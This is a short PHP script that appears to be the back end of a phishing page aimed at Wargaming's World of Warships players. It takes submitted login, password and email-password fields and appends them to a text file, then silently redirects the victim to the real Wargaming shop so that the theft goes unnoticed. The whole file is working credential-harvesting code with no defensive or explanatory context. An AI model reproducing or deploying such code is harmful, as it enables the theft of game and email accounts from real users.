<?PHP
$Log = $_POST['login'];
$Pass = $_POST['pass'];
$Pass2 = $_POST['emailpass'];
$log = fopen("database.txt","at");
fwrite($log,"$Log:$Pass:$Pass2\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://ru.wargaming.net/shop/wows/main/'></head></html>";
?>